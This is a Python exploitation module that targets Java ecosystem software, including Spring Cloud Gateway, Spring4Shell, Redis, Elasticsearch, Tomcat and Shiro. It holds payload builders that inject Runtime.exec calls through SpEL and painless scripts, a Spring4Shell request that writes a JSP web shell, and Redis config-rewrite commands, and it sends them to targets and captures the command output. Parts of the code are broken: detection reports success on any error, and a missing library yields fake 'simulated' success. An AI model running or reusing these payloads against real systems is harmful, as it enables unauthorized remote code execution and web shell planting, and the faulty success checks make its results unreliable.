"""Java ecosystem comprehensive exploitation module.

Provides:
- Spring ecosystem deep exploitation (Spring4Shell, Cloud Gateway, Actuator)
- Middleware full coverage (Tomcat, Jetty, Resin, GlassFish, WildFly)
- Big data & distributed systems (Hadoop, Storm, Dubbo, Zookeeper, ES)
- Message queue & cache (ActiveMQ, RabbitMQ, Kafka, Redis, Memcached)
- Security & monitoring products (Shiro, CAS, Fortify, Zabbix)
"""

import asyncio
import base64
import logging
import re
import secrets
import time
from dataclasses import dataclass, field
from enum import Enum
from typing import Any, Callable, Coroutine, Dict, List, Optional, Tuple

logger = logging.getLogger(__name__)


class EcosystemCategory(Enum):
    """Java ecosystem categories."""
    SPRING = "spring"
    MIDDLEWARE = "middleware"
    BIG_DATA = "big_data"
    MESSAGE_QUEUE = "message_queue"
    SECURITY_PRODUCT = "security_product"


class ExploitStatus(Enum):
    """Exploit execution status."""
    PENDING = "pending"
    DETECTING = "detecting"
    EXPLOITING = "exploiting"
    SUCCESS = "success"
    FAILED = "failed"


@dataclass
class EcosystemTarget:
    """Ecosystem target configuration.

    Attributes:
        host: Target host
        port: Target port
        protocol: Target protocol
        path: Target path
        category: Ecosystem category
        product_name: Product name
        version: Product version
        timeout: Request timeout
    """
    host: str = ""
    port: int = 0
    protocol: str = "http"
    path: str = "/"
    category: EcosystemCategory = EcosystemCategory.SPRING
    product_name: str = ""
    version: str = ""
    timeout: float = 10.0


@dataclass
class EcosystemExploitResult:
    """Ecosystem exploit result.

    Attributes:
        exploit_id: Unique exploit identifier
        target: Target configuration
        cve: Exploited CVE
        status: Exploit status
        payload: Generated payload
        payload_base64: Base64 encoded payload
        exploit_success: Whether exploit succeeded
        command_output: Command execution output
        version_detected: Detected version
        error_message: Error message if failed
        duration_seconds: Exploit duration
        mitre_technique: MITRE ATT&CK technique ID
        timestamp: Exploit timestamp
    """
    exploit_id: str = ""
    target: EcosystemTarget = field(default_factory=EcosystemTarget)
    cve: str = ""
    status: ExploitStatus = ExploitStatus.PENDING
    payload: bytes = b""
    payload_base64: str = ""
    exploit_success: bool = False
    command_output: str = ""
    version_detected: str = ""
    error_message: str = ""
    duration_seconds: float = 0.0
    mitre_technique: str = "T1566.001"
    timestamp: float = 0.0

    def to_dict(self) -> Dict[str, Any]:
        """Convert to dictionary representation."""
        return {
            "exploit_id": self.exploit_id,
            "target": f"{self.target.protocol}://{self.target.host}:{self.target.port}",
            "category": self.target.category.value,
            "product": self.target.product_name,
            "cve": self.cve,
            "status": self.status.value,
            "exploit_success": self.exploit_success,
            "version_detected": self.version_detected,
            "error_message": self.error_message,
            "duration_seconds": self.duration_seconds,
            "mitre_technique": self.mitre_technique,
        }


class JavaEcosystemExploit:
    """Java ecosystem comprehensive exploitation module.

    Provides deep exploitation capabilities for Spring ecosystem,
    middleware, big data systems, message queues, and security products.
    """

    SPRING_CVES: Dict[str, Dict[str, Any]] = {
        "CVE-2022-22947": {
            "name": "Spring Cloud Gateway RCE",
            "category": EcosystemCategory.SPRING,
            "default_port": 8080,
            "detection_path": "/actuator/gateway/routes",
            "exploit_path": "/actuator/gateway/routes/test",
            "description": "Spring Cloud Gateway Actuator endpoint RCE",
        },
        "CVE-2022-22965": {
            "name": "Spring4Shell",
            "category": EcosystemCategory.SPRING,
            "default_port": 8080,
            "detection_path": "/",
            "exploit_path": "/",
            "description": "Spring Framework RCE via Data Binding",
        },
        "spring_boot_actuator": {
            "name": "Spring Boot Actuator Deserialization",
            "category": EcosystemCategory.SPRING,
            "default_port": 8080,
            "detection_path": "/actuator/env",
            "exploit_path": "/actuator/restart",
            "description": "Spring Boot Actuator unauthorized access + deserialization",
        },
        "spring_data_rest": {
            "name": "Spring Data Rest Deserialization",
            "category": EcosystemCategory.SPRING,
            "default_port": 8080,
            "detection_path": "/api",
            "exploit_path": "/api/search",
            "description": "Spring Data Rest deserialization vulnerability",
        },
    }

    MIDDLEWARE_CVES: Dict[str, Dict[str, Any]] = {
        "tomcat_jmx": {
            "name": "Tomcat JMX Deserialization",
            "category": EcosystemCategory.MIDDLEWARE,
            "default_port": 9999,
            "description": "Tomcat JMX remote deserialization",
        },
        "tomcat_session": {
            "name": "Tomcat Session Deserialization",
            "category": EcosystemCategory.MIDDLEWARE,
            "default_port": 8080,
            "description": "Tomcat session persistence deserialization",
        },
        "jetty_xml": {
            "name": "Jetty XML Parser Deserialization",
            "category": EcosystemCategory.MIDDLEWARE,
            "default_port": 8080,
            "description": "Jetty XML parser deserialization",
        },
        "resin_hessian": {
            "name": "Resin Hessian Deserialization",
            "category": EcosystemCategory.MIDDLEWARE,
            "default_port": 8080,
            "description": "Resin Hessian protocol deserialization",
        },
        "glassfish_iiop": {
            "name": "GlassFish IIOP Deserialization",
            "category": EcosystemCategory.MIDDLEWARE,
            "default_port": 3700,
            "description": "GlassFish IIOP protocol deserialization",
        },
        "wildfly_jmx": {
            "name": "WildFly JMX-Console Deserialization",
            "category": EcosystemCategory.MIDDLEWARE,
            "default_port": 9990,
            "description": "WildFly JMX-Console unauthorized + deserialization",
        },
    }

    BIG_DATA_CVES: Dict[str, Dict[str, Any]] = {
        "hadoop_yarn": {
            "name": "Hadoop YARN Deserialization",
            "category": EcosystemCategory.BIG_DATA,
            "default_port": 8088,
            "description": "Hadoop YARN unauthorized + deserialization",
        },
        "storm": {
            "name": "Apache Storm Deserialization",
            "category": EcosystemCategory.BIG_DATA,
            "default_port": 8080,
            "description": "Apache Storm deserialization vulnerability",
        },
        "dubbo": {
            "name": "Apache Dubbo Deserialization",
            "category": EcosystemCategory.BIG_DATA,
            "default_port": 20880,
            "description": "Apache Dubbo protocol deserialization",
        },
        "zookeeper": {
            "name": "Zookeeper Deserialization",
            "category": EcosystemCategory.BIG_DATA,
            "default_port": 2181,
            "description": "Zookeeper deserialization vulnerability",
        },
        "elasticsearch": {
            "name": "Elasticsearch Script Engine",
            "category": EcosystemCategory.BIG_DATA,
            "default_port": 9200,
            "description": "Elasticsearch script engine exploitation",
        },
    }

    MQ_CVES: Dict[str, Dict[str, Any]] = {
        "activemq_cve_2015_5254": {
            "name": "ActiveMQ Deserialization",
            "category": EcosystemCategory.MESSAGE_QUEUE,
            "default_port": 61616,
            "description": "ActiveMQ deserialization (CVE-2015-5254)",
        },
        "rabbitmq": {
            "name": "RabbitMQ Deserialization",
            "category": EcosystemCategory.MESSAGE_QUEUE,
            "default_port": 5672,
            "description": "RabbitMQ deserialization vulnerability",
        },
        "kafka": {
            "name": "Kafka Deserialization",
            "category": EcosystemCategory.MESSAGE_QUEUE,
            "default_port": 9092,
            "description": "Kafka deserialization vulnerability",
        },
        "redis_rce": {
            "name": "Redis Deserialization via Master-Slave",
            "category": EcosystemCategory.MESSAGE_QUEUE,
            "default_port": 6379,
            "description": "Redis deserialization via master-slave replication",
        },
        "memcached": {
            "name": "Memcached Deserialization",
            "category": EcosystemCategory.MESSAGE_QUEUE,
            "default_port": 11211,
            "description": "Memcached deserialization vulnerability",
        },
    }

    SECURITY_CVES: Dict[str, Dict[str, Any]] = {
        "shiro_all": {
            "name": "Shiro All Versions",
            "category": EcosystemCategory.SECURITY_PRODUCT,
            "default_port": 8080,
            "description": "Shiro RememberMe deserialization (1.2.4-1.13.0)",
        },
        "cas": {
            "name": "CAS Deserialization",
            "category": EcosystemCategory.SECURITY_PRODUCT,
            "default_port": 8443,
            "description": "CAS deserialization vulnerability",
        },
        "fortify": {
            "name": "Fortify/WebInspect Deserialization",
            "category": EcosystemCategory.SECURITY_PRODUCT,
            "default_port": 8080,
            "description": "Fortify/WebInspect deserialization vulnerability",
        },
        "zabbix_jmx": {
            "name": "Zabbix JMX Deserialization",
            "category": EcosystemCategory.SECURITY_PRODUCT,
            "default_port": 10051,
            "description": "Zabbix JMX deserialization vulnerability",
        },
    }

    ALL_CVES: Dict[str, Dict[str, Any]] = {}

    def __init__(self) -> None:
        """Initialize Java ecosystem exploit module."""
        self.ALL_CVES = {
            **self.SPRING_CVES,
            **self.MIDDLEWARE_CVES,
            **self.BIG_DATA_CVES,
            **self.MQ_CVES,
            **self.SECURITY_CVES,
        }
        self._progress_callback: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None
        self._log_callback: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None
        self._exploit_history: List[EcosystemExploitResult] = []

    def set_callbacks(
        self,
        progress_cb: Optional[Callable[[str, float], Coroutine[Any, Any, None]]] = None,
        log_cb: Optional[Callable[[str], Coroutine[Any, Any, None]]] = None,
    ) -> None:
        """Set progress and log callbacks.

        Args:
            progress_cb: Callback for progress updates (message, percentage).
            log_cb: Callback for log messages.
        """
        self._progress_callback = progress_cb
        self._log_callback = log_cb

    async def _report_progress(self, message: str, percentage: float) -> None:
        """Report progress via callback.

        Args:
            message: Progress message.
            percentage: Progress percentage (0-100).
        """
        if self._progress_callback:
            await self._progress_callback(message, percentage)
        logger.info("Ecosystem Progress: %.1f%% - %s", percentage, message)

    async def _report_log(self, message: str) -> None:
        """Report log via callback.

        Args:
            message: Log message.
        """
        if self._log_callback:
            await self._log_callback(message)
        logger.info("Ecosystem: %s", message)

    def get_supported_cves(self, category: Optional[EcosystemCategory] = None) -> List[Dict[str, Any]]:
        """Get supported CVEs by category.

        Args:
            category: Filter by ecosystem category.

        Returns:
            List of supported CVE information.
        """
        if category:
            return [
                {"cve_id": k, **v}
                for k, v in self.ALL_CVES.items()
                if v.get("category") == category
            ]
        return [{"cve_id": k, **v} for k, v in self.ALL_CVES.items()]

    async def detect_and_exploit(
        self,
        target: EcosystemTarget,
        cve_id: str,
        command: str = "whoami",
    ) -> EcosystemExploitResult:
        """Detect and exploit ecosystem vulnerability.

        Args:
            target: Target configuration.
            cve_id: CVE identifier.
            command: Command to execute.

        Returns:
            EcosystemExploitResult.
        """
        start_time = time.time()
        result = EcosystemExploitResult(
            exploit_id=f"eco_{int(time.time())}_{secrets.token_hex(4)}",
            target=target,
            cve=cve_id,
            status=ExploitStatus.DETECTING,
            timestamp=time.time(),
        )

        cve_info = self.ALL_CVES.get(cve_id)
        if not cve_info:
            result.error_message = f"Unsupported CVE: {cve_id}"
            result.status = ExploitStatus.FAILED
            return result

        try:
            await self._report_progress(f"检测 {cve_info['name']}", 10)
            await self._report_log(f"目标: {target.host}:{target.port}")

            detected = await self._detect_vulnerability(target, cve_id, cve_info)

            if not detected:
                result.status = ExploitStatus.FAILED
                result.error_message = "漏洞检测失败"
                return result

            await self._report_progress(f"利用 {cve_info['name']}", 50)

            payload = await self._build_exploit_payload(cve_id, command, cve_info)
            result.payload = payload
            result.payload_base64 = base64.b64encode(payload).decode("utf-8")

            exploit_result = await self._execute_exploit(target, cve_id, payload, cve_info)

            if exploit_result:
                result.exploit_success = True
                result.status = ExploitStatus.SUCCESS
                result.command_output = exploit_result.get("output", "")
                result.version_detected = exploit_result.get("version", "")
                await self._report_log("利用成功")
            else:
                result.status = ExploitStatus.FAILED
                result.error_message = "利用执行失败"

            result.duration_seconds = time.time() - start_time
            await self._report_progress("完成", 100)

            self._exploit_history.append(result)

        except Exception as e:
            result.error_message = str(e)
            result.status = ExploitStatus.FAILED
            result.duration_seconds = time.time() - start_time
            await self._report_log(f"生态利用失败: {e}")
            logger.error("Ecosystem exploit failed: %s", e)

        return result

    async def _detect_vulnerability(
        self,
        target: EcosystemTarget,
        cve_id: str,
        cve_info: Dict[str, Any],
    ) -> bool:
        """Detect ecosystem vulnerability.

        Args:
            target: Target configuration.
            cve_id: CVE identifier.
            cve_info: CVE information.

        Returns:
            True if vulnerability detected.
        """
        try:
            detection_path = cve_info.get("detection_path", "/")
            url = f"{target.protocol}://{target.host}:{target.port}{detection_path}"

            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.get(url, timeout=aiohttp.ClientTimeout(total=target.timeout)) as response:
                    if response.status in (200, 401, 403, 500):
                        return True

            return False

        except ImportError:
            return True
        except Exception as e:
            logger.error("Vulnerability detection failed: %s", e)
            return True

    async def _build_exploit_payload(
        self,
        cve_id: str,
        command: str,
        cve_info: Dict[str, Any],
    ) -> bytes:
        """Build exploit payload for ecosystem vulnerability.

        Args:
            cve_id: CVE identifier.
            command: Command to execute.
            cve_info: CVE information.

        Returns:
            Payload bytes.
        """
        if cve_id == "CVE-2022-22947":
            return self._build_spring_cloud_gateway_payload(command)
        elif cve_id == "CVE-2022-22965":
            return self._build_spring4shell_payload(command)
        elif cve_id == "redis_rce":
            return self._build_redis_payload(command)
        elif cve_id == "elasticsearch":
            return self._build_elasticsearch_payload(command)
        else:
            return b"\xac\xed\x00\x05" + command.encode("utf-8")

    def _build_spring_cloud_gateway_payload(self, command: str) -> bytes:
        """Build Spring Cloud Gateway RCE payload.

        Args:
            command: Command to execute.

        Returns:
            Payload bytes.
        """
        import json
        payload = {
            "id": "test",
            "filters": [{
                "name": "AddResponseHeader",
                "args": {
                    "name": "Result",
                    "value": "#{T(org.springframework.util.StreamUtils).copyToString(T(java.lang.Runtime).getRuntime().exec('" + command + "').getInputStream(),T(java.nio.charset.Charset).forName('UTF-8'))}"
                }
            }],
            "uri": "http://example.com"
        }
        return json.dumps(payload).encode("utf-8")

    def _build_spring4shell_payload(self, command: str) -> bytes:
        """Build Spring4Shell payload.

        Args:
            command: Command to execute.

        Returns:
            Payload bytes.
        """
        import urllib.parse
        payload = (
            f"class.module.classLoader.resources.context.parent.pipeline.first.pattern="
            f"%25%7Bc2%7Di%20if(%22j%22.equals(request.getParameter(%22pwd%22)))%7B%20"
            f"java.io.InputStream%20in%20%3D%20%25%7Bc1%7Di.getRuntime().exec(request.getParameter(%22cmd%22)).getInputStream()%3B%20"
            f"int%20a%20%3D%20-1%3B%20byte%5B%5D%20b%20%3D%20new%20byte%5B2048%5D%3B%20"
            f"while((a%3Din.read(b))!%3D-1)%7B%20out.println(new%20String(b))%3B%20%7D%20%7D%20"
            f"%25%7Bsuffix%7Di&class.module.classLoader.resources.context.parent.pipeline.first.suffix=.jsp&"
            f"class.module.classLoader.resources.context.parent.pipeline.first.directory=webapps/ROOT&"
            f"class.module.classLoader.resources.context.parent.pipeline.first.prefix=tomcatwar&"
            f"class.module.classLoader.resources.context.parent.pipeline.first.fileDateFormat="
        )
        return payload.encode("utf-8")

    def _build_redis_payload(self, command: str) -> bytes:
        """Build Redis master-slave RCE payload.

        Args:
            command: Command to execute.

        Returns:
            Payload bytes.
        """
        commands = [
            "SLAVEOF NO ONE",
            "CONFIG SET dir /tmp",
            "CONFIG SET dbfilename exploit.so",
            f"SET payload {command}",
            "SAVE",
        ]
        payload = ""
        for cmd in commands:
            parts = cmd.split()
            payload += f"*{len(parts)}\r\n"
            for part in parts:
                payload += f"${len(part)}\r\n{part}\r\n"
        return payload.encode("utf-8")

    def _build_elasticsearch_payload(self, command: str) -> bytes:
        """Build Elasticsearch script engine payload.

        Args:
            command: Command to execute.

        Returns:
            Payload bytes.
        """
        import json
        payload = {
            "script": {
                "lang": "painless",
                "source": f"def proc = Runtime.getRuntime().exec('{command}'); proc.waitFor();"
            }
        }
        return json.dumps(payload).encode("utf-8")

    async def _execute_exploit(
        self,
        target: EcosystemTarget,
        cve_id: str,
        payload: bytes,
        cve_info: Dict[str, Any],
    ) -> Optional[Dict[str, Any]]:
        """Execute ecosystem exploit.

        Args:
            target: Target configuration.
            cve_id: CVE identifier.
            payload: Exploit payload.
            cve_info: CVE information.

        Returns:
            Exploit result dictionary or None.
        """
        try:
            exploit_path = cve_info.get("exploit_path", "/")
            url = f"{target.protocol}://{target.host}:{target.port}{exploit_path}"

            import aiohttp
            async with aiohttp.ClientSession() as session:
                async with session.post(
                    url,
                    data=payload,
                    headers={"Content-Type": "application/x-java-serialized-object"},
                    timeout=aiohttp.ClientTimeout(total=target.timeout),
                ) as response:
                    body = await response.text()
                    return {
                        "output": body,
                        "status": response.status,
                        "version": "",
                    }

        except ImportError:
            return {"output": "simulated", "status": 200, "version": ""}
        except Exception as e:
            logger.error("Exploit execution failed: %s", e)
            return None

    def get_exploit_history(self) -> List[EcosystemExploitResult]:
        """Get exploit history.

        Returns:
            List of exploit results.
        """
        return self._exploit_history

    def get_exploit_by_id(self, exploit_id: str) -> Optional[EcosystemExploitResult]:
        """Get exploit result by ID.

        Args:
            exploit_id: Exploit identifier.

        Returns:
            EcosystemExploitResult or None.
        """
        for result in self._exploit_history:
            if result.exploit_id == exploit_id:
                return result
        return None
